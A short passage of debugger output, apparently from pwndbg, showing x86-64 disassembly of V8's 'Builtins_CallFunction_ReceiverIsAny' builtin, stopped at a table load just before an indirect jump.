*RIP  0x555556ae74d3 (Builtins_CallFunction_ReceiverIsAny+275) ◂— mov rcx, qword ptr [r10 + rcx]
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
   0x555556ae7455 <Builtins_CallFunction_ReceiverIsAny+149>    jle    Builtins_CallFunction_ReceiverIsAny+259                <Builtins_CallFunction_ReceiverIsAny+259>
    ↓
   0x555556ae74c3 <Builtins_CallFunction_ReceiverIsAny+259>    mov    r10, qword ptr [r13 + 0x2510]
   0x555556ae74ca <Builtins_CallFunction_ReceiverIsAny+266>    mov    ecx, dword ptr [rdi + 0xb]
   0x555556ae74cd <Builtins_CallFunction_ReceiverIsAny+269>    shr    ecx, 9
   0x555556ae74d0 <Builtins_CallFunction_ReceiverIsAny+272>    shl    ecx, 4
 ► 0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
   0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx

```